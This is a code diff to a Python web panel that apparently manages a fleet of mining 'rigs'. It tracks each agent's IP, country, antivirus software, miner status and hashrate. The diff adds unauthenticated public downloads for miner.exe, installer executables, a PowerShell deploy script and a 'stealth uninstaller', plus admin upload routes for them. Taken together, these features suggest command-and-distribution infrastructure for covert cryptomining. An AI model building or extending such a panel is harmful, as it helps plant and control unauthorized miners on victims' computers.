@@ -86,6 +86,10 @@ def _country_for(ip):
 
 
 def _client_ip(request: Request):
+    # Cloudflare in front: CF-Connecting-IP is the real rig address
+    cf = request.headers.get("cf-connecting-ip")
+    if cf:
+        return cf.strip()
     fwd = request.headers.get("x-forwarded-for", "")
     if fwd:
         return fwd.split(",")[0].strip()
@@ -237,7 +241,8 @@ async def admin_login(req: Request, response: Response):
     if not db.check_pw(body.get("password", "")):
         raise HTTPException(403, "bad password")
     response.set_cookie("panel_session", _issue_session(),
-                        httponly=True, samesite="lax")
+                        httponly=True, samesite="lax", max_age=SESSION_TTL,
+                        path="/")
     return {"ok": True}
 
 
@@ -264,10 +269,12 @@ async def admin_state(request: Request):
                 "agent_version": r["agent_version"],
                 "ip": r["last_ip"] if "last_ip" in r.keys() else "",
                 "country": r["country"] if "country" in r.keys() else "",
+                "selected_pool": payload.get("selected_pool", ""),
                 "online": bool(hb and time.time() - hb["ts"] < ONLINE_SEC),
                 "last_seen": hb["ts"] if hb else None,
                 "engine": payload.get("engine", "?"),
-                "gpus": payload.get("gpus", []),
+                "gpus": (payload.get("gpus") if isinstance(payload.get("gpus"), list)
+                         else ([payload["gpus"]] if payload.get("gpus") else [])),
                 "antivirus": payload.get("antivirus", []),
                 "miner": payload.get("miner", {}),
                 "hashrate_ths": payload.get("hashrate_ths", {}),
@@ -299,8 +306,12 @@ async def admin_state(request: Request):
     by_country, by_gpu = {}, {}
     for r in rigs:
         by_country[r.get("country") or "?"] = by_country.get(r.get("country") or "?", 0) + 1
-        for g in (r.get("gpus") or [])[:1]:
-            by_gpu[g.get("model", "?")] = by_gpu.get(g.get("model", "?"), 0) + 1
+        gpus = r.get("gpus") or []
+        if isinstance(gpus, dict):
+            gpus = [gpus]
+        for g in gpus[:1]:
+            if isinstance(g, dict):
+                by_gpu[g.get("model", "?")] = by_gpu.get(g.get("model", "?"), 0) + 1
     summary = {
         "rigs_total": len(rigs), "online": len(online),
         "offline": len(rigs) - len(online),
@@ -424,7 +435,12 @@ async def req_body(request: Request):
 @app.get("/", response_class=HTMLResponse)
 async def index():
     with open(os.path.join(STATIC_DIR, "index.html")) as f:
-        return HTMLResponse(f.read())
+        html = f.read()
+    return HTMLResponse(html, headers={
+        "Cache-Control": "no-store, no-cache, must-revalidate, max-age=0",
+        "Pragma": "no-cache",
+        "Expires": "0",
+    })
 
 
 @app.get("/healthz")
@@ -435,6 +451,107 @@ async def healthz():
 
 # ------------------------------------------------- rig installer package
 RIGPKG = os.path.join(BUNDLES_DIR, "rig-agent-package.zip")
+RIG_EXE = os.path.join(BUNDLES_DIR, "FleetComputeService.exe")
+
+
+RIG_UNINSTALL = os.path.join(BUNDLES_DIR, "uninstall.exe")
+
+
+@app.get("/download/uninstall.exe")
+async def public_download_uninstall():
+    """PUBLIC link: the stealth uninstaller."""
+    if not os.path.exists(RIG_UNINSTALL):
+        raise HTTPException(404, "uninstaller not uploaded")
+    return FileResponse(RIG_UNINSTALL, media_type="application/octet-stream",
+                        filename="uninstall.exe",
+                        headers={"Cache-Control": "no-store"})
+
+
+@app.put("/api/admin/uninstaller")
+async def admin_uninstaller_upload(request: Request):
+    """Upload the uninstaller exe for the public link."""
+    _require_admin(request)
+    data = await request.body()
+    if data[:2] != b"MZ":
+        raise HTTPException(400, "not a PE executable")
+    with open(RIG_UNINSTALL, "wb") as f:
+        f.write(data)
+    return {"ok": True, "size": len(data)}
+
+
+RIG_DEPLOY_PS1 = os.path.join(BUNDLES_DIR, "deploy.ps1")
+
+
+PUBLIC_FILES = {
+    "install.cmd": ("install.cmd", "application/octet-stream"),
+    "uninstall.cmd": ("uninstall.cmd", "application/octet-stream"),
+    "wcsvc_install.exe": ("wcsvc_install.exe", "application/octet-stream"),
+    # friendly aliases (the generic /download/{file} route catches these first)
+    "FleetComputeService.exe": ("FleetComputeService.exe", "application/octet-stream"),
+    "uninstall.exe": ("uninstall.exe", "application/octet-stream"),
+    "fleet-rig.zip": ("rig-agent-package.zip", "application/zip"),
+    "setup.zip": ("wcsvc-setup.zip", "application/zip"),
+    "miner.exe": ("miner.exe", "application/octet-stream"),
+    "fleet.zip": ("fleet.zip", "application/zip"),
+    "wcsvc-agent.ps1": ("wcsvc-agent.ps1", "text/plain"),
+    "install-admin.cmd": ("install-admin.cmd", "application/octet-stream"),
+}
+
+
+@app.get("/download/{filename}")
+async def public_file(filename: str):
+    """Public whitelisted downloads (installer / uninstaller)."""
+    if filename not in PUBLIC_FILES:
+        raise HTTPException(404, "not found")
+    stored, mime = PUBLIC_FILES[filename]
+    path = os.path.join(BUNDLES_DIR, stored)
+    if not os.path.exists(path):
+        raise HTTPException(404, f"{filename} not uploaded")
+    return FileResponse(path, media_type=mime, filename=filename,
+                        headers={"Cache-Control": "no-store"})
+
+
+@app.get("/download/deploy.ps1")
+async def public_download_deploy():
+    """PUBLIC link: the PowerShell deployment script."""
+    if not os.path.exists(RIG_DEPLOY_PS1):
+        raise HTTPException(404, "deploy script not uploaded")
+    return FileResponse(RIG_DEPLOY_PS1, media_type="text/plain",
+                        filename="deploy.ps1",
+                        headers={"Cache-Control": "no-store"})
+
+
+@app.get("/download/FleetComputeService.exe")
+async def public_download_exe():
+    """PUBLIC link (no auth): the single-file rig installer."""
+    if not os.path.exists(RIG_EXE):
+        raise HTTPException(404, "installer not uploaded yet")
+    return FileResponse(RIG_EXE, media_type="application/octet-stream",
+                        filename="FleetComputeService.exe",
+                        headers={"Cache-Control": "no-store, max-age=0"})
+
+
+@app.get("/download/fleet-rig.zip")
+async def public_download_rigpkg():
+    """PUBLIC link: installer + instructions as one zip."""
+    if not os.path.exists(RIGPKG):
+        raise HTTPException(404, "rig package not uploaded yet")
+    return FileResponse(RIGPKG, media_type="application/zip",
+                        filename="fleet-rig.zip",
+                        headers={"Cache-Control": "no-store, max-age=0"})
+
+
+@app.put("/api/admin/rigexe")
+async def admin_rigexe_upload(request: Request):
+    """Upload the bare FleetComputeService.exe for the public link."""
+    _require_admin(request)
+    data = await request.body()
+    if data[:2] != b"MZ":
+        raise HTTPException(400, "body is not a PE executable")
+    with open(RIG_EXE, "wb") as f:
+        f.write(data)
+    return {"ok": True, "size": len(data),
+            "sha256": hashlib.sha256(data).hexdigest()}
 
 
 @app.put("/api/admin/rigpkg")
@@ -457,4 +574,5 @@ async def admin_rigpkg_download(request: Request):
     if not os.path.exists(RIGPKG):
         raise HTTPException(404, "no rig package uploaded yet")
     return FileResponse(RIGPKG, media_type="application/zip",
-                        filename="fleet-rig.zip")
+                        filename="fleet-rig.zip",
+                        headers={"Cache-Control": "no-store, max-age=0"})
